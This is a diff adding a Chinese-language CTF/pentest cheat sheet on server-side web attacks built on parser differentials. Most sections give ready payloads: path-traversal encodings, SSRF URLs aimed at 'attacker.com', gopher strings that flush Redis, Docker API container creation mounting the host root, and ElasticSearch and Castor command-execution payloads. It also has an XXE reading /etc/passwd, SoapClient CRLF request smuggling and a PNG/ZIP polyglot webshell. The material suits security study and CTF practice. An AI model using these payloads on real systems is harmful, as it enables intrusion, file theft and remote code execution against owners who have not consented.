@@ -1,0 +1,661 @@
+---
+
+phase: webapp
+vuln_class: [path-traversal, ssrf, deserialization, template-injection, parser-differential]
+title: 服务端高级技巧
+summary: 高级技巧的共同点只有一个：两个组件对同一份输入的理解不一致。按「谁和谁不一致」分类，比按 CVE 记有效。
+---
+
+# 服务端高级技巧
+
+基础注入见 [[web/漏洞分类/注入类/server-side.md|server-side.md]]；代码执行与上传见 [[web/漏洞分类/注入类/server-side-exec.md|server-side-exec.md]]；反序列化见 [[web/漏洞分类/注入类/server-side-deser.md|server-side-deser.md]]。
+
+## 0. 判据速查
+
+| 差分发生在 | 表现 | 去哪节 |
+|---|---|---|
+| 校验器 vs 文件系统（路径） | 各种穿越变形 | §1 |
+| 代理 vs 后端（URL 解析） | `parse_url` 与 curl/nginx 结论不同 | §2 |
+| 应用 vs 解析器（编码） | 多字节、非断空格、同形字 | §3 |
+| 框架 vs 我的输入（模板/调试） | SSTI、Werkzeug 控制台 | §4 |
+| SSRF 客户端 vs 目标协议 | gopher 打 MySQL/Redis/Docker | §5 |
+| 反序列化器 vs 类型声明 | `xsi:type`、Flight、Castor | §6 |
+| 语言层 vs 系统层（数值/长度） | rune vs byte、8.3 短名、截断 | §7 |
+| 输出渲染层 | XSLT 随机数、PDF/SVG 渲染器 | §8 |
+
+**核心判据**：一个输入被两个组件读，只要两边结论不同，就有绕过。**先问「谁在读这个输入、读了几次」**，比背 payload 表有效。
+
+---
+
+## 1. 路径穿越
+
+### 1.1 变形全集
+
+```
+../              ....//           ....\/           ..%2f
+..%252f          %2e%2e/          ..%c0%af          ..%ef%bc%8f
+..;/             ..%00/           ..././            ....//
+```
+
+**递归替换残留**：`str_replace('../','')` 只跑一次时，`....//` 删掉中间那个 `../` 后，两侧拼成新的 `../`。
+
+**花括号剥离**：`{../}` 之类在某些解析器里会被剥成 `../`。
+
+**Python `os.path.join` 的绝对路径覆盖**：
+
+```python
+os.path.join('/safe/base', '/etc/passwd')   # → '/etc/passwd'（第二个是绝对路径，直接覆盖）
+```
+
+**判据**：`join` 遇到绝对路径会丢弃前面的部分。任何用 `os.path.join` 拼「用户可控相对路径」的代码，传绝对路径即可跳出。
+
+### 1.2 Nginx `alias` 尾斜杠不匹配
+
+```nginx
+location /laravel {
+    alias /var/www/html/public/;     # 注意：location 无尾斜杠，alias 有
+}
+```
+
+`/laravel<anything>` 映射到 `/var/www/html/public/<anything>`，于是：
+
+```bash
+curl 'http://target/laravel../.env'      # → /var/www/html/.env
+```
+
+**判据**：`location` 与 `alias` 的尾斜杠不一致就有这条。用 `location /laravel/ { alias .../public/; }` 对齐。
+
+（题目例证：VolgaCTF 2018）
+
+### 1.3 `/dev/fd` 绕过 `/proc` 过滤
+
+过滤器只拦 `proc` 字面串时，用 `/dev/fd/N`（指向 `/proc/self/fd/N`）：
+
+```bash
+cat /dev/fd/3          # 等价 /proc/self/fd/3
+```
+
+### 1.4 Unicode 同形字 `U+2E2E`
+
+ASCII 点校验被绕过：
+
+```
+U+2E2E = ⸮ (REVERSED QUESTION MARK)，UTF-8: 0xE2 0xB8 0xAE
+NFKC/NFC 归一化后 → U+002E (.)
+```
+
+```bash
+curl 'http://target/?file=⸮⸮⸮⸮flag.txt'      # 后端归一化成 ../../flag.txt
+```
+
+**判据**：后端在「校验之后、访问文件系统之前」做了 Unicode 归一化。同族：全角 `／`（U+FF0F）、`．`（U+FF0E）。
+
+（题目例证：CSAW 2017）
+
+### 1.5 URL 编码斜杠
+
+后端框架不把 `%2f` 当分隔符，但文件系统层会解：
+
+```bash
+curl 'http://target/static..%2f..%2f..%2fetc%2fpasswd'
+curl 'http://target/static..%252f..%252fetc%252fpasswd'    # 双重编码
+```
+
+### 1.6 base64 编码路径
+
+路径被 base64 解码后再用时，编码 `../../` 即可：
+
+```python
+import base64
+base64.b64encode(b'../../flag.txt')      # Li4vLi4vZmxhZy50eHQ=
+```
+
+**判据**：参数看起来是 base64（长度是 4 的倍数、只有 `[A-Za-z0-9+/=]`）→ 先解开看内容。
+
+（题目例证：Sharif CTF 2016）
+
+### 1.7 `basename()` 只看最后一段 → 读不到隐藏文件
+
+```php
+$file = basename($_GET['f']);      // "....//....//etc/passwd" → "passwd"
+```
+
+反过来，隐藏文件（`.env`、`.git/config`）以点开头时，`basename` 会保留点。**构造末尾是目标隐藏文件名的路径**：
+
+```
+....//....//.env      → basename = ".env"
+```
+
+（题目例证：Nullcon 2026）
+
+### 1.8 Windows 8.3 短名
+
+长文件名在 NTFS 上有 8.3 短名（`Progra~1`、`DOCUME~1`）：
+
+```bash
+curl 'http://target/?f=../../PROGRA~1/COMMON~1/...'
+```
+
+**判据**：Windows 目标 + 长路径被拦时。用 `dir /x` 在本地同版本系统查短名。
+
+（题目例证：Tokyo Westerns 2016）
+
+### 1.9 软链接压缩包
+
+zip 里放指向目标的软链接，服务器解压后跟随：
+
+```bash
+ln -s /flag.txt link
+zip -y exploit.zip link      # -y 保留软链接
+```
+
+上传后访问解压出的 `link` 即读到 `/flag.txt`。
+
+（题目例证：UTCTF 2024）
+
+### 1.10 借 SQLite 做「字符串相等」绕过
+
+应用把用户输入当**文件路径**存/读 SQLite，而比较是字符串相等。用穿越让两次不同的输入落到同一个文件：
+
+```
+输入 A: /tmp/x/../data.db
+输入 B: /tmp/data.db
+```
+
+字符串不等（绕过去重/校验），文件相同。
+
+（题目例证：Codegate 2013）
+
+---
+
+## 2. URL 解析差分
+
+### 2.1 `parse_url()` 与 curl 的 `@` 分歧
+
+```php
+$url = 'http://attacker.com@target.com/secret';
+parse_url($url)['host']    // 'target.com'  ← 校验看到的是 target
+// 但 curl 用整串，实际连到 attacker.com（或反之，取决于实现）
+```
+
+PHP 的 `parse_url` 把 `@` 前当 userinfo，host 取 `@` 后；某些 HTTP 客户端反过来。**任一侧的 host 判断都可能与真实连接目标不符**。
+
+```bash
+curl 'http://target/proxy?url=http://expected.com@attacker.com/'
+curl 'http://target/proxy?url=http://attacker.com#@expected.com/'
+```
+
+**判据**：任何「用 `parse_url` 校验 host，再用 curl/file_get_contents 发请求」的组合。
+
+（题目例证：EKOPARTY 2016；33C3 CTF 2016）
+
+### 2.2 多斜杠绕过 `path.startswith`
+
+```python
+if not path.startswith('/static/'): reject()
+```
+
+```
+//static/../secret        # startswith('/static/') 为 False？取决于实现
+///static/../secret
+```
+
+更常见的是**后端**（如 Werkzeug、nginx）把 `//static/` 归一化成 `/static/`，而 Python 的 `startswith` 看的是原始串。
+
+（题目例证：CSAW 2018 Finals）
+
+### 2.3 绝对 URI 形式
+
+```http
+GET http://target.com/admin HTTP/1.1
+Host: target.com
+```
+
+部分代理/WAF 只解析相对路径，绝对 URI 形式的 path 取不到。
+
+### 2.4 Nginx `%2F` 与后端路由
+
+见 [[web/漏洞分类/认证与会话/auth-and-access.md|认证与访问控制 §5.2]] —— Express 不解码 `%2F`，nginx 解码。
+
+---
+
+## 3. 编码与字符集差分
+
+### 3.1 Go rune vs byte 长度
+
+```go
+len(s)                    // 字节数
+utf8.RuneCountInString(s) // 字符数
+```
+
+校验用 `len(s) <= 10` 而后续处理按 rune 截断（或反过来），就能让校验看到的长度和实际处理的不一致。
+
+```
+输入: 5 个汉字 + 命令注入
+len() = 15 + n  （字节）
+rune 数 = 5 + n
+```
+
+**判据**：Go 里混用 `len()` 和 `[]rune()`/`utf8.RuneCountInString`。
+
+（题目例证：VuwCTF 2025）
+
+### 3.2 HQL 注入用非断空格
+
+HQL 解析器把 `\u00a0`（NBSP）当空白，而 WAF/过滤器只认 ASCII 空格：
+
+```
+username: admin\u00a0' or '1'='1
+```
+
+**判据**：Java/Hibernate 目标 + 空格被拦。同族：`\u2000`–`\u200a`、`\u3000`（全角空格）、`\t`、`\n`。
+
+（题目例证：HackIM 2016）
+
+### 3.3 Ruby `Regexp.escape` 多字节缺陷
+
+`Regexp.escape` 逐字节加反斜杠，对多字节字符会在**字符中间**插入 `\`，产生非法但被正则引擎容忍的序列：
+
+```
+输入含 UTF-8 多字节字符 → 转义后字节流被正则解析成不同含义
+```
+
+**判据**：Ruby 应用用 `Regexp.escape(user_input)` 构造正则，且输入可含多字节字符。
+
+（题目例证：Square CTF 2017）
+
+### 3.4 全角字符归一化
+
+```
+／ U+FF0F → /
+． U+FF0E → .
+： U+FF1A → :
+＜ U+FF1C → <
+```
+
+浏览器和部分后端会做 NFKC 归一化，而校验层用原始串。
+
+```python
+import unicodedata
+[chr(c) for c in range(0xFF00, 0xFF5F)
+ if unicodedata.normalize('NFKC', chr(c)) != chr(c)][:10]
+```
+
+---
+
+## 4. 框架层
+
+### 4.1 Werkzeug 调试控制台
+
+`debug=True` 且 PIN 泄露/可算时，直接拿交互式 Python：
+
+```
+http://target/console
+```
+
+**PIN 计算**依赖 `machine-id`、`mac` 地址、`username`、`modname`、`app name`。任一可读（路径穿越读 `/etc/machine-id`、`/sys/class/net/*/address`）就能算出来。
+
+```python
+# 用 werkzeug-debug-console-pin 或手算
+```
+
+**判据**：访问任意不存在的路由出现「Werkzeug Debugger」页面，或 `/console` 可访问。
+
+（题目例证：多题通用）
+
+### 4.2 XSS → SSTI 链
+
+Flask 的错误页把用户输入渲染进模板时，XSS 的注入点其实是 SSTI 的：
+
+```
+{{7*7}}  →  49（在错误页的反射点里）
+```
+
+**判据**：XSS 注入点在 Jinja2/Twig 渲染的模板里（错误页、邮件模板、PDF 模板）。先试 `{{7*7}}` 而不是 `<script>`。
+
+（题目例证：SECUINSIDE 2016）
+
+### 4.3 Pongo2 / Go 模板 + 路径穿越
+
+模板名来自用户输入且可穿越时，读任意模板文件（可能含 flag 或可控制的模板）：
+
+```
+?template=../../flag.txt
+```
+
+**判据**：模板名/主题名/语言包名可传参。
+
+（题目例证：Nullcon 2026）
+
+### 4.4 Apache `ErrorDocument` 表达式文件读
+
+```apache
+ErrorDocument 404 /index.php?err=404
+```
+
+`ErrorDocument` 的值可以是**内部重定向 URL**，也可被配成表达式。配置可控时用它读文件。
+
+（题目例证：Zero HTB）
+
+### 4.5 React Server Components Flight 反序列化
+
+RSC 的 Flight 协议在 `Next-Action` 头触发时反序列化客户端数据。
+
+**识别**：
+
+```bash
+curl -sI http://target/ | grep -i "next\|rsc\|vary"
+# Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch
+# x-nextjs-* 头
+```
+
+**利用要点**：
+- Flight 载荷是类 JSON 的流格式，支持 `$` 前缀的特殊引用（模块引用、Promise、类型化值）
+- 构造引用到服务端模块的载荷，在反序列化时实例化
+- 回显常走 `NEXT_REDIRECT`（把数据放进重定向目标）
+- WAF 拦关键字时用 Flight 的字符串拆分/转义形式绕
+
+**判据**：响应头有 `Vary: RSC` 或 `Next-Action` 可用，且存在接受 action 的端点。
+
+（题目例证：EHAX 2026）
+
+---
+
+## 5. SSRF 打内网协议
+
+### 5.1 `gopher://` 无 host 形式
+
+`gopher://` 允许直接发原始 TCP 字节，用来打 MySQL / Redis / Docker / SMTP：
+
+```
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+```
+
+**无 host 变体**（部分客户端允许省略 host，用 `_` 后跟 payload）：
+
+```
+gopher://_<urlencoded payload>
+```
+
+**判据**：SSRF 的协议白名单里漏了 `gopher`。它能带任意字节，是打内网非 HTTP 服务的唯一通用手段。
+
+（题目例证：35C3 CTF 2018）
+
+### 5.2 gopher 打 MySQL 盲注
+
+要点：
+1. 先 `SET NAMES utf8` / 握手响应要正确（MySQL 4.1+ 协议）
+2. 用 `SELECT ... INTO OUTFILE` 或时间盲注（`SLEEP`）
+3. 认证包要能构造（免密或已知密码）
+
+```python
+# 用 Gopherus 生成，或手写 MySQL 握手
+```
+
+（题目例证：34C3 CTF 2017；AceBear 2018）
+
+### 5.3 SSRF → Docker API RCE
+
+Docker daemon 的 2375/2376 端口开放时：
+
+```
+POST /containers/create?...
+POST /containers/{id}/start
+```
+
+配合 `Binds` 挂载宿主 `/` 即可读写宿主文件。
+
+```json
+{"Image":"alpine","Cmd":["/bin/sh","-c","cat /flag > /host/flag"],
+ "Binds":["/:/host"]}
+```
+
+（题目例证：H7CTF 2025）
+
+### 5.4 ElasticSearch Groovy `script_fields` RCE
+
+ES 1.x 的 Groovy 动态脚本：
+
+```json
+{"script_fields":{"x":{"script":"java.lang.Runtime.getRuntime().exec('id')"}}}
+```
+
+配合 SSRF 从内网访问 ES。**判据**：内网有 ES 9200 且版本 < 1.4（动态脚本默认开）。
+
+（题目例证：VolgaCTF 2017）
+
+### 5.5 伪造 MySQL 服务端读客户端文件
+
+`LOAD DATA LOCAL INFILE` 是**客户端**读文件发给服务端。攻击者起一个假 MySQL，客户端连上后就会把指定文件内容发过来。
+
+```python
+# rogue-mysql-server，设置 file_request 为 /etc/passwd
+```
+
+**判据**：应用有「连接用户提供的数据库」的功能。危害等同任意文件读。
+
+（题目例证：VolgaCTF 2018）
+
+### 5.6 `wget` 的 CRLF 注入
+
+`wget` 把 URL 里的 `\r\n` 写进请求头：
+
+```
+http://target/%0d%0aMAIL FROM:<x>%0d%0aRCPT TO:<y>%0d%0aDATA
+```
+
+用来把 SSRF 变成 SMTP 会话。
+
+（题目例证：SECCON 2017）
+
+### 5.7 出网 URL 由攻击者指定 → 凭证泄露
+
+服务端把内部凭证拼进出站请求（`Authorization`、API key），而 URL 可控时，凭证直接发到攻击者服务器。
+
+**判据**：任何「把用户给的 URL 拿去 fetch，且请求带服务端凭证」的实现。修法：域名白名单 + 凭证不跨域。
+
+（题目例证：ASIS Finals 2018）
+
+### 5.8 WeasyPrint（CVE-2024-28184）
+
+HTML→PDF 渲染器会加载 `file://` 和任意 URL：
+
+```html
+<link rel="attachment" href="file:///etc/passwd">
+<img src="http://internal:8080/admin">
+```
+
+两个变体：
+- **盲 SSRF**：attachment 触发加载，用响应时间/错误判断
+- **本地文件读**：`file://` 附件进 PDF
+
+（题目例证：Nullcon 2026）
+
+### 5.9 CairoSVG XXE
+
+SVG 渲染器解析 XML 外部实体。用超大的 `width=` 让渲染失败并把错误信息（含实体内容）带出来：
+
+```xml
+<svg width="99999999" xmlns="http://www.w3.org/2000/svg">
+  <!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>
+  <text>&x;</text>
+</svg>
+```
+
+（题目例证：BSidesSF 2019）
+
+### 5.10 图片/文档处理器的隐式请求
+
+`ExifTool`（CVE-2021-22204）：DjVu 文件的 `(metadata "...")` 注解里可以放 Perl 表达式，ExifTool 用 Perl 解析时执行：
+
+```bash
+# 构造恶意 DjVu，上传后由 ExifTool 处理
+```
+
+（题目例证：0xFun 2026）
+
+---
+
+## 6. 反序列化与类型多态
+
+### 6.1 Castor XML `xsi:type` 多态
+
+Castor 按 `xsi:type` 实例化任意类。指定一个有副作用的类（如 `java.lang.ProcessBuilder` 或应用内的 gadget）：
+
+```xml
+<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <field xsi:type="java.lang.ProcessBuilder">
+    <command>id</command>
+  </field>
+</root>
+```
+
+**判据**：XML 绑定库（Castor、XStream、Jackson XML）接受 `xsi:type` 或 `class` 属性且未开白名单。
+
+（题目例证：Atlas HTB）
+
+### 6.2 其他见专项篇
+
+PHP `unserialize`、Java `ysoserial`、Python `pickle`、.NET `TypeNameHandling`、`SoapClient` CRLF → [[web/漏洞分类/注入类/server-side-deser.md|server-side-deser.md]] 与 [[web/漏洞分类/反序列化/反序列化测试.md|反序列化测试]]。
+
+### 6.3 `SoapClient` 的 `_user_agent` CRLF
+
+`SoapClient` 的 `user_agent` 选项不过滤 CRLF，可走私完整请求：
+
+```php
+$c = new SoapClient(null, [
+  'location' => 'http://target/',
+  'uri' => "http://x/\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: x",
+  'user_agent' => 'x',
+]);
+```
+
+序列化后作为 cookie 发送，反序列化时触发。
+
+（题目例证：35C3 CTF 2018）
+
+---
+
+## 7. 语言/系统层数值差
+
+### 7.1 截断导致的越界
+
+1 字节长度字段在 256 处回绕成 0（见 [[web/漏洞分类/注入类/server-side-exec.md|server-side-exec §6.2]]）。
+
+### 7.2 INSERT 双字段列位移
+
+```sql
+INSERT INTO t (a, b) VALUES ('x', 'y')
+```
+
+注入让值个数与列数错位，后面的值整体前移一列，把可控值塞进高权限字段：
+
+```
+a = "attacker", b = "user"  →  注入后 b 变成 "admin"
+```
+
+**判据**：应用拼 SQL 的 VALUES 而非用参数化查询时，错位会静默改字段。
+
+（题目例证：CyberSecurityRumble 2016）
+
+### 7.3 时间戳种子 PRNG 造 session
+
+```python
+# 服务端 session = md5(username + timestamp)
+for ts in range(int(time.time()) - 60, int(time.time()) + 10):
+    if md5(f"admin{ts}") == target_cookie: ...
+```
+
+（题目例证：CyberSecurityRumble 2016）
+
+---
+
+## 8. 渲染层
+
+### 8.1 Xalan XSLT `math:random()` 种子可猜
+
+Xalan 的 `math:random()` 用 `java.util.Random` 默认构造（时间种子）。同一秒内多次调用序列可预测：
+
+```xslt
+<xsl:value-of select="math:random()"/>
+```
+
+拿到几个输出后反推种子，预测后续值（常用于绕过随机化的路径/文件名）。
+
+（题目例证：35C3 2018）
+
+### 8.2 LaTeX `write18` 受限时的 `mpost`
+
+`write18` 被禁用（`shell_escape=f`）时，MetaPost 的 `mpost` 仍可能可用：
+
+```latex
+\documentclass{article}
+\begin{document}
+\immediate\write18{mpost -tex=latex \jobname.mp}
+\end{document}
+```
+
+`mpost` 的 `-tex` 参数会调用 `latex`，而 `latex` 又能 `\write18` —— 绕过限制。
+
+（题目例证：33C3 CTF 2016）
+
+### 8.3 WAV polyglot + `.wave` 扩展名
+
+音频处理器认 `.wav` 但不认 `.wave`，或反过来。用 `.wave` 上传时绕过音频校验，内容却是可执行/可解析的：
+
+```bash
+cp shell.php exploit.wave
+```
+
+（题目例证：PlaidCTF 2018）
+
+### 8.4 PHP `zip://` + PNG/ZIP polyglot
+
+```bash
+# 一个文件同时是合法 PNG 和合法 ZIP
+cat image.png shell.zip > polyglot.png
+```
+
+```
+?file=zip://polyglot.png%23shell.php
+```
+
+`zip://` wrapper 从 PNG 里取出 zip 条目并当 PHP 执行。
+
+（题目例证：PlaidCTF 2016）
+
+---
+
+## 9. 侦察与取证
+
+### 9.1 Bazaar (`.bzr`) 仓库重建
+
+暴露的 `.bzr/` 可通过 `bzr check` 循环 + 日志重建源码：
+
+```bash
+bzr branch http://target/.bzr/ repo
+bzr log --show-ids
+bzr revert -r <revno>
+```
+
+**判据**：`.bzr/`、`.hg/`、`.svn/`、`.git/` 任何一个可访问。`.git` 用 `git-dumper`。
+
+（题目例证：STEM CTF 2019）
+
+### 9.2 AMQP/TLS 中间人
+
+`sslsplit` + `arpspoof` 拦 AMQP over TLS，解出凭证。
+
+（题目例证：TAMUctf 2019）
+
+---
+
+## 10. 纪律
+
+- **先问「谁和谁对不上」**。这篇所有技巧都是解析差分，找到差分点比记 payload 有效。
+- **路径穿越先穷举变形再想绕过**。`....//`、`%252f`、`..;/`、同形字这几类覆盖了绝大多数校验器。
+- **`parse_url` / `urlparse` 的结果不能当真实连接目标**。永远对比「校验看到的 host」和「客户端实际连的 host」。
+- **`gopher://` 是 SSRF 的万能钥匙**。协议白名单漏了它，内网任何 TCP 服务都能打。
+- **反序列化先找类型声明入口**。`xsi:type`、`class`、`__type`、`$type` 这些字段出现就是多态反序列化。
+- **数值/长度类 bug 要问「两边算的是不是同一个东西」**。byte vs rune、1 字节长度回绕、8.3 短名，都是这个形状。
+- **报的是具体数据/执行结果**。「存在解析差分」不是漏洞，读到 flag 才是。
